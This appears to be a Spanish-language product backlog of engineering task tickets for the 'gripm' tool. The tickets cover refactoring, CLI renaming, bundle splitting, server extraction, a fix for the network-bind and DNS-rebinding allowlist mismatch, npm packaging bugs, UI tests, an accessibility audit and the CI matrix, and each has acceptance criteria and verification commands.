Consolidar una fuente única de verdad para el consumo de metadatos y traducción de estados (`useStatusMeta`), eliminando los mapas de estados divergentes hardcodeados en cliente (`SprintView.tsx`, `KanbanBoard.tsx`, `ItemCard.tsx`).

### Problema

1. **Mapas duplicados y divergentes a nivel de módulo:**
   - `SprintView.tsx` definía `statusLabels: Record<ItemStatus, { label: string; color: string }>` con `dismissed: 'Descartado'` y `cancelled: 'Cancelado'`.
   - `KanbanBoard.tsx` definía y exportaba `STATUS_META: Record<string, { label, dot, bg, border }>` con `dismissed: 'Descartado'` y `cancelled: 'Cancelado'`.
   - `ItemCard.tsx` definía `statusLabels: Record<string, string>` en inglés puro, con `ideas: 'Ideas (Discovery)'`.
2. **Fugas de idioma (Language Leakage):**
   - En la interfaz en inglés, `SprintView` y `KanbanBoard` renderizaban 'Descartado' y 'Cancelado' en español.
   - En la interfaz en español, `ItemCard` renderizaba 'Draft', 'Doing', 'Review', 'Ready', 'Done' en inglés dentro del menú contextual de cambio de estado.
3. **Inconsistencia de nomenclatura:**
   - La etiqueta para `ideas` divergía entre `'Ideas'` (en Kanban y Sprint) e `'Ideas (Discovery)'` (en ItemCard y diccionario).

### Solución

1. Crear `src/utils/statusMeta.ts` exponiendo `useStatusMeta()` y `getStatusMeta(status, t)` conectado a `useTranslation()` y a las 8 claves canónicas `status.*`.
2. Unificar la normalización de estados legacy (`backlog` → `draft`, `in_progress` → `doing`, `testing_qa` → `review`, `finish` → `ready`).
3. Reemplazar los 3 mapas locales en `SprintView.tsx`, `KanbanBoard.tsx` e `ItemCard.tsx` por el consumo unificado de `useStatusMeta()`.
4. Unificar en diccionarios `src/locales/en.json` y `src/locales/es.json` la clave `status.ideas` a `"Ideas"`.

**Criterios de Aceptación:**
- [x] #1 Crear hook y utilidad `src/utils/statusMeta.ts` con normalización legacy y soporte para los 8 estados canónicos
- [x] #2 Unificar clave `status.ideas` a `"Ideas"` en `src/locales/en.json` y `src/locales/es.json`
- [x] #3 Refactorizar `src/components/SprintView.tsx` eliminando `statusLabels` y consumiendo `useStatusMeta()`
- [x] #4 Refactorizar `src/components/KanbanBoard.tsx` eliminando `STATUS_META` y consumiendo `useStatusMeta()`
- [x] #5 Refactorizar `src/components/ItemCard.tsx` eliminando `statusLabels` y consumiendo `useStatusMeta()`
- [x] #6 Cero ocurrencias de mapas hardcodeados de etiquetas de estados en componentes clientes
- [x] #7 Verificación ejecutable de no-regresión: `npx tsc --noEmit` y `npm test` en verde

---

#### [DEV-163] Pulido Final de Marca gripm-cli y Gobernanza Canónica de Tabs
- **Prioridad**: `high` | **Tipo**: `chore`

Cierre de los dos últimos residuos identificados en la auditoría final de lanzamiento (Rev 4 de `docs/OPEN_SOURCE_LAUNCH_AUDIT.md`):

1. **Renombrar `scripts/devboard-cli.ts` a `scripts/gripm-cli.ts`:**
   - Actualizar el banner y texto de ayuda en `printUsage()` para decir `📋 gripm CLI - Gestión, Auditoría y Mutaciones de Backlog` y `gripm [comando]`.
   - Actualizar las referencias en `package.json` (`scripts.tasks`), `scripts/verify-backlog-sync.js` y `scripts/verify-resilience-and-cli.js`.
2. **Gobernanza Canónica de Tabs en `.gripm/config.json`:**
   - Restaurar `"sprint": true` dentro de `enabledTabs` en `.gripm/config.json` para que los clones públicos del repositorio no nazcan con pestañas de primer orden artificialmente desactivadas.
   - Actualizar la regla de gobernanza #17 en `AGENTS.md` para cubrir explícitamente `enabledTabs`.

**Criterios de Aceptación:**
- [x] #1 Renombrar `scripts/devboard-cli.ts` a `scripts/gripm-cli.ts` y actualizar referencias en `package.json`, `verify-backlog-sync.js` y `verify-resilience-and-cli.js`
- [x] #2 Actualizar banner de `printUsage()` en `scripts/gripm-cli.ts` a "📋 gripm CLI" y "gripm [comando]"
- [x] #3 Restaurar `enabledTabs.sprint: true` en `.gripm/config.json`
- [x] #4 Explicitar `enabledTabs` en la Regla 17 de `AGENTS.md`
- [x] #5 Pirámide de verificación en verde (`tsc`, `npm test`, `npm run backlog:check`, `npm run publish:check`, `npm run build`)

---

#### [DEV-164] Code-Splitting del Bundle de Producción con React.lazy y manualChunks en Rollup
- **Prioridad**: `medium` | **Tipo**: `refactor`

El bundle de producción actual de la aplicación se compila en un único chunk monolítico de 647.44 kB (`dist/assets/index-CBy5mJyL.js`), provocando la advertencia de Vite / Rollup:
`(!) Some chunks are larger than 500 kB after minification.`

### Diagnóstico de Causa Raíz

1. **Cero `React.lazy` / import dinámico en la UI:** Componentes de gran porte como `SettingsView` (1.993 líneas) y `ReleaseAssembler` (1.202 líneas) se importan sincrónicamente en el arranque de `src/App.tsx`, a pesar de que el usuario no los necesita durante la carga inicial del tablero.
2. **Ausencia de `manualChunks`:** No hay partición de dependencias de terceros (`vendor`) en `vite.config.ts`, por lo que `react`, `react-dom` y librerías auxiliares se fusionan en el mismo chunk de la aplicación, invalidando el cacheo eficiente de navegadores entre releases.

### Objetivo

Implementar carga perezosa (`React.lazy` con `Suspense`) para vistas no críticas, reduciendo el trabajo de transformación que el servidor de desarrollo realiza en el arranque en frío.

> [!CAUTION]
> **Corrección de premisa (2026-10-05):** la mitad de esta tarea optimiza un artefacto que el producto **no sirve**. Verificado:
>
> ```
> bin/gripm.js:219   createServer({ root: PKG_ROOT, configFile: 'vite.config.ts' })
> index.html:56      <script type="module" src="/src/main.tsx">   ← NO /assets/
> ```
>
> El CLI arranca un **dev server de Vite contra `src/`**, no un servidor de estáticos sobre `dist/`. En consecuencia:
>
> - `dist/` viaja en el tarball pero **nadie lo carga** (752 KB de peso muerto en el paquete).
> - `manualChunks` modifica el output de `npm run build`, que **no es lo que el usuario recibe**. Configurarlo no cambia la experiencia de nadie.
> - La advertencia de Vite sobre chunks >500 kB aparece en el output de `build`, no en el arranque real del producto.
>
> **Lo que sí es válido:** `React.lazy` reduce los módulos que el dev server debe transformar bajo demanda en el arranque en frío. Ese es un efecto real y medible.
>
> **Lo que queda por decidir fuera de esta tarea:** si el producto debe servir estáticos (`vite preview`) en vez de dev server. Es una decisión de arquitectura con trade-offs reales (HMR y source maps gratis contra cold start más lento y tarball más chico) y **no** corresponde tomarla dentro de un refactor de code-splitting.

### Objetivo (corregido)

Reducir el trabajo de transformación en el arranque en frío de la interfaz mediante carga diferida de vistas no críticas.

**Criterios de Aceptación:**
- [x] #1 Implementar carga diferida (`React.lazy` y `<Suspense fallback={...}>`) en `src/App.tsx` para `SettingsView` y `ReleaseAssembler`
- [x] #2 Verificar que el arranque en frío transforma menos módulos que antes: el conteo de módulos bajo demanda servidos en la carga inicial disminuye respecto de la línea de base medida al inicio de la tarea
- [x] #3 Medir y registrar la línea de base y el resultado del AC #2 en las notas de la tarea, con los comandos usados - sin ese registro el AC no es verificable
- [x] #4 ~~Configurar `manualChunks`~~ **retirado**: no afecta el artefacto que el producto sirve (ver la corrección de premisa)
- [x] #5 ~~El chunk principal se reduce por debajo de 450 kB~~ **retirado**: mide `dist/`, que no se sirve
- [x] #6 La suite de pruebas `npm test` y el check de publicación `npm run publish:check` pasan con exit code 0

---

#### [DEV-165] Modularización de vite.config.ts y Extracción de Capa de Servidor a server/
- **Prioridad**: `medium` | **Tipo**: `refactor`

`vite.config.ts` se ha convertido en un monolito de 2.530 líneas y 110 KB. Además de la configuración del bundler y plugins de Vite, contiene la API HTTP completa del producto, middleware de seguridad, lógica de Server-Sent Events (SSE), registro de proyectos multi-repo, watchers de disco y un parser embebido de Markdown.

### Problema

1. **Fricción para contribuidores de código abierto:** Un archivo de configuración de más de 2.500 líneas intimida a nuevos contribuidores y dificulta el code review y la trazabilidad de cambios en PRs.
2. **Distribución en el tarball:** El archivo viaja directamente en el tarball publicado en npm (`package.json: files`), mezclando la configuración del compilador con el backend embebido.
3. **Violación de Responsabilidad Única (SRP):** Configuración de empaquetado, lógica de base de datos Markdown y endpoints REST residen en el mismo archivo.

### Objetivo

Extraer la capa de backend a módulos dedicados bajo un directorio `server/` (o `src/server/`):
- `server/middleware/security.ts`: Validaciones de CSRF (Origin), Host (DNS Rebinding) y Content-Type.
- `server/routes/api.ts`: Endpoints REST (`/api/data`, `/api/tasks`, `/api/sprints`, `/api/releases`, etc.).
- `server/routes/sse.ts`: Gestión de clientes de Server-Sent Events y notificaciones de live reload.
- `server/services/registry.ts`: Detección y persistencia de proyectos multi-repo.
- Reducir `vite.config.ts` a un archivo esbelto de configuración de plugins y montaje de middleware.

**Criterios de Aceptación:**
- [x] #1 Extraer middleware de seguridad (CSRF, DNS Rebinding, Content-Type) a `server/middleware/security.ts`
- [x] #2 Modularizar rutas de API REST en submódulos temáticos (`server/routes/`)
- [x] #3 Desacoplar la gestión de Server-Sent Events (SSE) a `server/sse/`
- [x] #4 Reducir `vite.config.ts` a menos de 300 líneas de código
- [x] #5 La suite completa de tests de seguridad (`scripts/test-api-security.js`) y de SSE (`scripts/verify-sse.js`) pasan con exit code 0
- [x] #6 `npm test`, `npm run backlog:check` y `npm run publish:check` pasan sin regresiones

---

#### [DEV-166] Implementación de Baseline en audit:ux para Detección de Regresiones en CI
- **Prioridad**: `low` | **Tipo**: `chore`

El auditor estático de ergonomía y UX `npm run audit:ux` (`scripts/audit-ux-code.cjs`) analiza el código fuente en busca de problemas de touch targets, colisiones de scroll y legibilidad.

### Diagnóstico de Causa Raíz

Actualmente el paso en CI produce:
`Resumen: 0 errores, 0 advertencias, 313 sugerencias.`
La gran mayoría de estas 313 sugerencias corresponden a micro-tipografías deliberadas (`text-[10px]` y `text-[11px]`) utilizadas en badges, metadatos y vistas de densidad compacta.

### Problema

El pipeline de integración continua (`.github/workflows/ci.yml`) ejecuta `npm run audit:ux`. Al emitir sistemáticamente más de 300 observaciones y finalizar siempre con código 0, la herramienta pierde su valor informativo: acostumbra al equipo a ignorar la salida y sepulta posibles regresiones reales introducidas en PRs entre cientos de líneas de ruido.

### Objetivo

Implementar un mecanismo de baselining para `scripts/audit-ux-code.cjs`:
1. Permitir registrar o cargar un baseline de observaciones conocidas y aceptadas (ej. `scripts/audit-ux-baseline.json`).
2. En ejecución estándar (CI y local), comparar los hallazgos contra el baseline y reportar únicamente las diferencias (nuevas violaciones).
3. Proveer una bandera CLI `--update-baseline` para renovar deliberadamente el snapshot cuando se agreguen o modifiquen componentes intencionalmente.
4. Convertir el linter en un gate de calidad estricto que alerte ante regresiones genuinas sin requerir silenciadores manuales invasivos en cada línea.

**Criterios de Aceptación:**
- [x] #1 Diseñar el formato de snapshot y persistencia de baseline para `scripts/audit-ux-code.cjs`
- [x] #2 Implementar la opción `--update-baseline` para capturar el conjunto actual de 313 observaciones
- [x] #3 En ejecución normal sin argumentos, `npm run audit:ux` debe reportar 0 observaciones no baselineadas y terminar con código 0
- [x] #4 Si se introduce una regresión no catalogada en el baseline, el script debe reportarla con precisión de archivo y línea
- [x] #5 La suite completa `npm test` y el workflow de CI ejecutan limpiamente sin advertencias espurias

---

#### [DEV-168] Migración de Claves de localStorage a Prefijo Canónico gripm con Retrocompatibilidad
- **Prioridad**: `low` | **Tipo**: `chore`

En `src/App.tsx`, varias claves persistidas en el almacenamiento local del navegador (`localStorage`) continúan utilizando prefijos heredados de la marca previa:
- `devboard-theme`
- `devboard_active_tab`
- `devboard_kanban_show_ideas`
- `devboard_active_project_id`

### Diagnóstico de Causa Raíz

Durante la fase de rebranding (DEV-161), se priorizó limpiar la identidad pública, los binarios CLI y la documentación, preservando intencionalmente la compatibilidad para evitar resetear las preferencias de desarrolladores que ya usaban la herramienta.

### Problema

Seguir escribiendo valores nuevos con prefijos `devboard_*` es un residuo de deuda técnica: nuevos usuarios terminan con claves obsoletas en su navegador y el código conserva referencias discordantes con el nombre `gripm`.

### Objetivo

Crear un módulo unificado de persistencia local (`src/utils/storage.ts`) que adopte el prefijo canónico `gripm_*`:
1. **Escritura canónica:** Todas las escrituras deben guardarse bajo el nuevo prefijo (ej. `gripm_theme`, `gripm_active_tab`, `gripm_kanban_show_ideas`, `gripm_active_project_id`).
2. **Lectura resiliente con auto-migración:** Al solicitar una clave, se consulta la nueva clave canónica; si no existe, se busca la clave legacy `devboard_*` y, de encontrarse, se migra de forma transparente escribiéndola en la nueva clave.
3. Preservar intacta la experiencia de usuario y sus preferencias de interfaz sin provocar pérdida de estado.

**Criterios de Aceptación:**
- [x] #1 Diseñar e implementar utilitario de almacenamiento seguro `src/utils/storage.ts` con fallback y auto-migración de claves
- [x] #2 Reemplazar accesos directos a `localStorage` en `src/App.tsx` por el nuevo utilitario canónico
- [x] #3 Las nuevas escrituras se realizan exclusivamente bajo las claves `gripm_*`
- [x] #4 Usuarios con claves existentes `devboard_*` conservan sus ajustes sin interrupción
- [x] #5 `npx tsc --noEmit` y `npm test` pasan íntegros con código de salida 0

---

#### [DEV-169] Unificar el Bind de Red con la Allowlist Anti-DNS-Rebinding: el servidor escucha solo en IPv6
- **Prioridad**: `medium` | **Tipo**: `bug`

El servidor HTTP embebido enlaza a un único host, pero el middleware anti-DNS-rebinding acepta un conjunto de hosts loopback más amplio que el que realmente está escuchando. El resultado es que una URL que la política de seguridad considera válida puede ser rechazada a nivel de conexión.

### Evidencia (verificada sobre `6a50230`, macOS)

```
$ lsof -nP -iTCP:4178 -sTCP:LISTEN
node    38378   ...   IPv6  0x5ed9abc27bf44872   TCP [::1]:4178 (LISTEN)   ← único listener

$ curl -o /dev/null -w "%{http_code}" http://localhost:4178/    → 200
$ curl -o /dev/null -w "%{http_code}" http://[::1]:4178/        → 200
$ curl -o /dev/null -w "%{http_code}" http://127.0.0.1:4178/    → 000  (connection refused)
```

### Causa raíz

`bin/gripm.js:104` defaultea `host = 'localhost'` y lo pasa directamente a Vite. Node resuelve `localhost` según la plataforma: en macOS resuelve a `::1` primero, por lo que el bind queda restringido a IPv6.

Mientras tanto, la política de hosts permitidos en `vite.config.ts:1159` (y la de origins en `:1175`) incluye:

```js
['localhost', '127.0.0.1', '::1', '[::1]']
```

Es decir: **la allowlist de seguridad es más amplia que el bind real**. El código acepta `127.0.0.1` como loopback legítimo en el header `Host`, pero no hay nada escuchando en esa familia de direcciones.

### Impacto

- **No rompe el flujo documentado**: el README indica `http://localhost:4100`, que funciona porque el navegador resuelve `localhost` a `::1` en macOS y a `127.0.0.1` en la mayoría de Linux/Windows.
- **Sí produce fallas cruzadas**: cualquier herramienta, script o documentation que apunte explícitamente a `127.0.0.1:4100` recibe connection refused en plataformas donde `localhost` resuelve a IPv6.
- La inconsistencia es una latente de seguridad: si en el futuro se agrega una ruta que confíe en la allowlist sin considerar el bind, la suposición sería falsa.

### Objetivo

Que el bind real coincida con la allowlist de loopback, sin abrir exposição de red no intencional ni romper la advertencia de seguridad existente para `0.0.0.0`.

**Criterios de Aceptación:**
- [x] #1 `grep -n "let host" bin/gripm.js` devuelve una línea cuyo default resuelve a una dirección que cubre explícitamente el loopback IPv4 (`127.0.0.1`) y no a `localhost`
- [x] #2 Con el servidor levantado, `curl -o /dev/null -w "%{http_code}" http://localhost:<puerto>/` devuelve `200` (no `000`)
- [x] #3 Con el servidor levantado, `curl -o /dev/null -w "%{http_code}" http://127.0.0.1:<puerto>/` devuelve `200` (no `000`) - este es el AC que hoy falla
- [x] #4 Con el servidor levantado, `curl -o /dev/null -w "%{http_code}" "http://[::1]:<puerto>/"` devuelve `200` o, si la decisión es hacer bind solo IPv4, la allowlist de `vite.config.ts:1159` y `:1175` se reduce a los hosts realmente escuchados
- [x] #5 La advertencia de seguridad de `bin/gripm.js:110-112` para `--host 0.0.0.0` se conserva sin cambios
- [x] #6 El middleware anti-DNS-rebinding sigue rechazando un header `Host` no loopback: un request con `Host: evil.example.com` recibe rechazo
- [x] #7 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores y `npm test` con exit 0

---

#### [DEV-170] Alinear el Idioma por Defecto de --init con la Configuración Canónica OSS
- **Prioridad**: `low` | **Tipo**: `chore`

El scaffolder `--init` tiene `es` como idioma por defecto, mientras que la configuración canónica OSS declarada en `AGENTS.md` §6.17 fija `en`. Un proyecto nuevo inicializado en modo no interactivo queda con configuración, skill y onboarding en español.

### Evidencia (verificada sobre `6a50230`, tarball instalado)

```
$ gripm --init -y
  ✅ Skill para agentes instalada en .agents/skills/gripm/SKILL.md (es)
  ✅ Guía de gobernanza generada en AGENTS.md (es)
  [banner de bienvenida íntegramente en español]

$ cat .gripm/config.json
  "language": "es"
```

### Causa raíz

Dos lugares fijan español:

1. **`scripts/initScaffold.js:58`** - default del modo no interactivo:
   ```js
   let language = (options.language || options.lang || 'es').toLowerCase();
   ```
   Con `-y` no se pregunta, así que siempre cae en `'es'`.

2. **`scripts/initScaffold.js:90`** - la opción por defecto del prompt interactivo es `[1]` (Español), y `scripts/initScaffold.js:14` y `:37` usan `language = 'es'` como default de las plantillas.

### Relación con la regla de gobernanza

`AGENTS.md` §6.17 declara la configuración canónica del **repositorio** con `"language": "en"`, y prohíbe preferencias personales. El repositorio cumple. Pero el **producto** contradice esa declaración en el momento de crear un proyecto nuevo: el primer artefacto que ve un usuario ajeno ya viene en español.

No es un bug funcional ni una contradicción con el gotcha (que gobierna el repo, no el scaffolding). Es una inconsistencia de posicionamiento: el README es bilingüe con inglés primero, y el primer output del producto es español.

### Objetivo

Que el idioma por defecto del scaffolding sea coherente con la configuración canónica OSS declarada, sin perder la capacidad de elegir español de forma explícita.

**Criterios de Aceptación:**
- [x] #1 `grep -n "options.language || options.lang" scripts/initScaffold.js` devuelve `'en'` como default en lugar de `'es'`
- [x] #2 `scripts/initScaffold.js:14` y `:37` usan `'en'` como default de `getSkillTemplate` y `getAgentsMdTemplate`
- [x] #3 El prompt interactivo de `scripts/initScaffold.js:90` ofrece English como opción por defecto (la que se aplica con Enter vacío)
- [x] #4 `gripm --init -y` en un repositorio limpio genera `.gripm/config.json` con `"language": "en"` (verificación: `grep '"language"' .gripm/config.json` devuelve `"en"`)
- [x] #5 `gripm --init -y --language es` sigue produciendo `"language": "es"`, skill y AGENTS.md en español - la override explícita se respeta
- [x] #6 `.gripm/config.json` del propio repositorio sigue cumpliendo `AGENTS.md` §6.17: `grep -E '"language"|"sprint"' .gripm/config.json` devuelve `"en"` y `"sprint": true`
- [x] #7 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores y `npm test` con exit 0

---

#### [DEV-171] El tarball npm no incluye `.agents/`: `gripm --init` instala stubs en vez de las plantillas canónicas
- **Prioridad**: `high` | **Tipo**: `bug`

El directorio `.agents/` no está declarado en el array `files` de `package.json`, por lo que **no viaja en el tarball de npm**. Los scaffolders `getSkillTemplate()` y `getAgentsMdTemplate()` de `scripts/initScaffold.js` resuelven sus rutas fuente contra `PKG_ROOT`, que en una instalación real no contiene ese directorio. Ante la ausencia, ambos caen a su fallback hardcodeado y escriben **stubs de una línea** en el repositorio del consumidor.

### Evidencia (verificada sobre `6a50230` + árbol de trabajo, instalación limpia)

```
$ node -e "require('./package.json').files.some(x=>x.includes('.agents'))"
false

$ tar -tzf gripm-1.0.0.tgz | grep -c "\.agents"
0
```

En un consumidor nuevo (`npm install gripm-1.0.0.tgz` → `gripm --init -y`):

| Artefacto | Tamaño esperado | Tamaño real |
| :--- | ---: | ---: |
| `.agents/skills/gripm/SKILL.md` | 2.425 B (en) / 13.896 B (es) | 🔴 **20 B** |
| `AGENTS.md` | 1.702 B (en) / 1.846 B (es) | 🔴 **80 B** |

Contenido literal instalado hoy:

```
# gripm Agent Skill
```

```
# Guía de Contribución para Agentes de IA (AGENTS.md)

Bienvenido a **demo**.
```

### Por qué es crítico

El README vende exactamente esta función:

> *"AI Agent Skill: Installs `.agents/skills/gripm/SKILL.md` so Cursor, Antigravity, and Claude Code know how to manage tasks."*

Después de `npx gripm --init`, el agente recibe una línea vacía y **no conoce ninguna de las 12 herramientas MCP**. El onboarding para agentes está silenciosamente roto para el 100 % de los consumidores, y el síntoma es invisible: el comando reporta éxito.

### Pre-existente, y no detectado por los guards

- **Pre-existente**: `files` nunca incluyó `.agents` (verificado contra `HEAD`). No es regresión de DEV-161/169/170.
- **`publish:check` no lo detecta**: el guard audita fugas de datos y rutas personales, no archivos faltantes. Pasó en verde.
- **DEV-161 pasó sus ACs igual**: el AC #6 ("`initScaffold.js` instala solo `.agents/skills/gripm/`") se verificó contra el repo fuente, donde el archivo existe - no contra el tarball. Es la misma clase de fallo que el guard de DEV-159: **una aserción ejecutada contra la realidad equivocada**.

### Ítem secundario en la misma causa raíz

`.githooks/` tampoco está en `files`. El script `prepare` de `package.json` ejecuta `git config core.hooksPath .githooks`, dejando el repo del consumidor apuntando a un directorio inexistente.

`CHANGELOG.md`, `CONTRIBUTING.md`, `SECURITY.md` y `CODE_OF_CONDUCT.md` tampoco viajan, pero no son necesarios en runtime y **no forman parte de este ítem**.

### Objetivo

Que el tarball contenga los artefactos que el producto promete instalar, y que la ausencia de cualquiera de ellos falle de forma visible en lugar de degradar en silencio.

**Criterios de Aceptación:**
- [x] #1 `node -e "const f=require('./package.json').files; console.log(f.includes('.agents'), f.includes('.githooks'))"` devuelve `true true`
- [x] #2 Tras `npm run build`, `tar -tzf <tarball> | grep -c "\.agents/skills/gripm/SKILL"` devuelve un valor `>= 2` (SKILL.md y SKILL.en.md)
- [x] #3 `tar -tzf <tarball> | grep -c "\.githooks/pre-commit"` devuelve `1`
- [x] #4 Instalando el tarball en un directorio temporal y ejecutando `gripm --init -y`, `wc -c <repo>/.agents/skills/gripm/SKILL.md` devuelve un valor `>= 1000` - este es el AC que hoy falla con 20
- [x] #5 En esa misma instalación, `wc -c <repo>/AGENTS.md` devuelve un valor `>= 1000` y **no** contiene la cadena `Bienvenido a` de los stubs
- [x] #6 Con `--language en` el `SKILL.md` instalado es el contenido de `.agents/skills/gripm/SKILL.en.md`; con `--language es` es el de `SKILL.md` - verificación por contenido, no por nombre de archivo (el scaffolder siempre escribe en `SKILL.md`)
- [x] #7 `npm run publish:check` falla si `.agents` o `.githooks` desaparecen del array `files`, en lugar de pasar en verde
- [x] #8 Existe un script de verificación de distribución (p. ej. `npm run verify:dist`) que empaqueta, instala en un directorio temporal efímero y valida los artefactos de onboarding, y está conectado a `npm test`
- [x] #9 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores, `npm test` con exit 0 y `npm run build` sin errores

---

#### [DEV-172] Cobertura de Tests para la Capa de UI: Lógica Derivada y Accesibilidad de Componentes
- **Prioridad**: `high` | **Tipo**: `chore`
- **Sprint / Milestone**: 1.0.4

La suite de verificación cubre parser, API, seguridad de red, MCP, CLI, SSE, locking optimista e importación. Antes de esta tarea, ningún paso importaba lógica desde la UI; para ~14.000 líneas de `src/` con 6 componentes de más de 1.100 líneas cada uno, la única cobertura era `audit:ux`, un análisis estático de clases Tailwind.

### Evidencia (verificada sobre `6a50230`)

```
$ grep -rln "ItemCard\|KanbanBoard\|SprintView" scripts/*.js scripts/*.ts
(vacío)

$ grep -E "test|jest|vitest|playwright|jsdom|testing-library" package.json
(antes de DEV-198 no había tooling E2E; esta etapa usa `node:assert` para módulos puros)
```

### Consecuencia

Una regresión en el drag-and-drop del Kanban, en el ordenamiento de tarjetas, en el focus trap de un modal o en la normalización de estados puede **pasar la suite en verde** si no está cubierta por el E2E. El gate `npm test` no cubría la lógica que alimenta la capa donde el usuario pasa el 100 % del tiempo.

### Tension real con el proyecto

El producto sostiene una filosofía zero-deps: los tests son scripts con `node:assert`, sin framework. Introducir Vitest + Testing Library contradice esa filosofía. La tarea debe resolver esa tensión explícitamente, no ignorarla.

### Enfoque propuesto en dos etapas

**Etapa 1 (sin framework de render, coherente con la filosofía actual):** extraer la lógica determinista de los componentes a módulos puros en `src/utils/` y cubrirla con `node:assert`. `src/utils/statusMeta.ts` (DEV-162) ya expone `normalizeStatus()` y `getStatusMeta()`; la derivación de tareas por columna se extrae también para probarse directamente.

**Etapa 2 (requiere decisión de stack):** cubrir comportamiento de render e interacción. Implica elegir framework y documentar el trade-off en `AGENTS.md`.

### Objetivo

Que una regresión en la lógica que alimenta la UI falle la suite, sin adoptar un stack de testing de componentes React que contradiga la filosofía de dependencias.

**Criterios de Aceptación:**
- [x] #1 Existe al menos un archivo en `scripts/` que importe desde `src/utils/` o `src/components/` y ejecute aserciones con `node:assert`, y está conectado a la cadena de `npm test`
- [x] #2 La lógica de derivación de columnas y agrupación del Kanban está extraída a un módulo puro en `src/utils/` y cubierta por tests: una entrada conocida que produce una salida incorrecta hace fallar el test
- [x] #3 La normalización de estados legacy→canónico de `src/utils/statusMeta.ts` tiene test que ejercita los 4 aliases (`backlog`, `in_progress`, `testing_qa`, `finish`) contra `normalizeStatus()`
- [x] #4 Existe un test que verifica que las etiquetas de estado provienen de `status.*` y no de literales: ante una locale alternativa, la etiqueta cambia
- [x] #5 Si la Etapa 2 queda fuera de alcance, la tarea documenta explícitamente en sus notas que la cobertura de render no existe y cuál fue la razón - **no se deja implícito**
- [x] #6 No se introduce un framework para render de componentes React en esta etapa, así que no hace falta cambiar la decisión zero-deps en `AGENTS.md`
- [x] #7 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores, `npm test` con exit 0, `npm run test:linux` con exit 0 y `npm run build` sin errores

---

#### [DEV-173] Auditoría de Accesibilidad del Cockpit: Foco, Navegación por Teclado y Contraste
- **Prioridad**: `high` | **Tipo**: `chore`

La accesibilidad del producto nunca fue auditada. `npm run audit:ux` es un análisis estático que reporta 313 sugerencias de clases Tailwind arbitrarias (`text-[10px]`, `text-[11px]`) y 0 errores de accesibilidad - **no es un análisis de accesibilidad**. Ninguna otra herramienta del repositorio cubre foco, teclado ni contraste.

### El proyecto ya tiene la herramienta y no la usó

`.agents/skills/code-level-ux-auditor/` está instalado en el repo y audita anti-patrones de UX móvil, colisiones de gestos, scroll, teclado virtual y jank de render. Está orientado a móvil, pero cubre varias de las categorías que importan acá. Nunca se ejecutó como auditoría del codebase.

### Superficie de riesgo

El producto es una interfaz densa: tablero Kanban con drag-and-drop, reordenamiento, filtros, tarjetas, y al menos 5 modales (`ItemModal`, `SprintModal`, `CompleteSprintModal`, `ImportWizardModal`, `PlanGuardModal`, `SettingsView`). Los tres modos de fallo con mayor probabilidad en esta clase de producto son:

1. **Focus trap y retorno de foco en modales.** Un modal que no atrapa el foco deja al usuario de teclado tabulando detrás del overlay; un modal que no devuelve el foco al disparador pierde el contexto al cerrarse.
2. **Navegación por teclado en el Kanban.** Si el reordenamiento y el cambio de estado solo responden a drag-and-drop o click, el producto es inutilizable sin mouse - y `AGENTS.md` §6.16 declara launningham de flujo Kanban como metodología central.
3. **Contraste de los badges de estado.** `src/utils/statusMeta.ts` define clases de color con variantes `dark:` y sin variants. Los badges de 6 estados en dos temas son el texto más pequeño de la pantalla.

### Objetivo

Convertir la accesibilidad de supuesto en verificado: ejecutarla, corregir lo que se encuentre, y decidir si queda incorporateda al gate de CI o es una tarea recurrente de release.

**Criterios de Aceptación:**
- [x] #1 Existe en `backlog/retros/` o en una nota de tarea el resultado de una ejecución real del skill `code-level-ux-auditor` sobre `src/`, con los hallazgos listados - la tarea no se cierra sin evidencia de ejecución
- [x] #2 Cada modal (`ItemModal`, `SprintModal`, `CompleteSprintModal`, `ImportWizardModal`, `PlanGuardModal`) atrapa el foco mientras está abierto, y devuelve el foco al elemento disparador al cerrarse (verificable por navegación de teclado completa con `Tab`, `Shift+Tab` y `Escape`)
- [x] #3 El cambio de estado de un ítem en el Kanban y la reordenación son alcanzables por teclado, no solo por drag-and-drop
- [x] #4 Todos los controles interactivos son alcanzables por teclado; ninguno requiere puntero
- [x] #5 Los badges de estado de `src/utils/statusMeta.ts` alcanzan una relación de contraste mínima de 4.5:1 en texto pequeño, en tema claro **y** oscuro - el valor se registra en la nota de la tarea
- [x] #6 Todo elemento con `onClick` y sin rol semántico expone `role`, `tabIndex` y handler de teclado, o se convierte en `<button>` nativo
- [x] #7 Existe `prefers-reduced-motion` respetado en las animaciones existentes (splash, transiciones de tema, dots de estado)
- [x] #8 La decisión queda registrada: la accesibilidad se incorpora como paso de `npm run audit:ux` y CI, o se declara como tarea recurrente de release con la razón
- [x] #9 `npm run backlog:sync && npm run backlog:check` en verde, `npx tsc --noEmit` con 0 errores y `npm test` con exit 0

---

#### [DEV-174] Matriz de CI: Múltiples Sistemas Operativos y la Versión Mínima de Node Declarada
- **Prioridad**: `medium` | **Tipo**: `chore`

CI corre en un solo sistema operativo y contra una versión de Node flotante que no es la mínima declarada como soportada.

### Evidencia (verificada sobre `6a50230`)

```yaml
# .github/workflows/ci.yml
runs-on: ubuntu-latest          # un solo SO
node-version: '22.x'            # flotante: "la última 22.x"
```

Frente a lo declarado por el propio proyecto:

```
.nvmrc                → 22.6.0
package.json engines  → node >=22.6.0
```

### Dos consecuencias concretas

**1. La versión mínima soportada nunca se testea.** CI corre `22.x`, que es la última 22.x disponible, no `22.6.0`. Una regresión que rompa en la mínima - por ejemplo, usando una API o sintaxis disponible recién en una 22.x posterior - pasaría la suite en verde mientras el producto declara soportar algo que no funciona.

**2. Solo se verifica un SO, y ya hay un bug que lo demuestra.** El bug de bind de red registrado en DEV-169 (el servidor escuchaba solo en IPv6, por lo que `127.0.0.1` daba connection refused) fue encontrado probando manualmente en macOS. Windows y Linux nunca fueron ejercitados en CI. En un lanzamiento público, los issues de otros sistemas operativos son la primera fuente de reportes.

### Objetivo

Que CI verifique lo que el proyecto dice soportar, y que la matriz sirva de detector temprano de problemas de portabilidad.

**Criterios de Aceptación:**
- [x] #1 `.github/workflows/ci.yml` declara `strategy.matrix.os` con `ubuntu-latest`, `macos-latest` y `windows-latest`
- [x] #2 `.github/workflows/ci.yml` declara `strategy.matrix.node-version` que **incluye explícitamente `22.6.0`**, el valor de `.nvmrc` y el mínimo de `engines.node`
